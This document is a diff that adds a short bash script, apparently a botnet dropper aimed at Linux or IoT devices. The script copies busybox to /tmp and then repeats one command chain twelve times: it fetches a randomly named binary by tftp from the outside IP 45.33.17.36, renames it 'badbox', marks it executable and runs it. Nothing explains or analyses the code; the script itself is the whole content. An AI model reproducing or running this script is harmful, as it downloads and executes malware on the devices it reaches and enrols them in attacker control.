@@ -1,0 +1,15 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get wqdfwafgasdasdhg;cat wqdfwafgasdasdhg >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get asdwdasdafawwd2;cat asdwdasdafawwd2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get hasdasdwasd3;cat hasdasdwasd3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get wlooasdugahs4;cat wlooasdugahs4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get hasdwkhansnmas5;cat hasdwkhansnmas5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get ghkqwdwiujnasiudhbasd6;cat ghkqwdwiujnasiudhbasd6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get gasjdniuqbngtinasd7;cat gasjdniuqbngtinasd7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get kaniupbnpiugnwiunadnsdw8;cat kaniupbnpiugnwiunadnsdw8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get nioaunhoiugbnaisnd9;cat nioaunhoiugbnaisnd9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get jnapsiudhbniygnasd10;cat jnapsiudhbniygnasd10 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get hkmwqionduioasndamsd11;cat hkmwqionduioasndamsd11 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.33.17.36 -c get hweaksnmdiuanpsudnasd12;cat hweaksnmdiuanpsudnasd12 >badbox;chmod +x *;./badbox
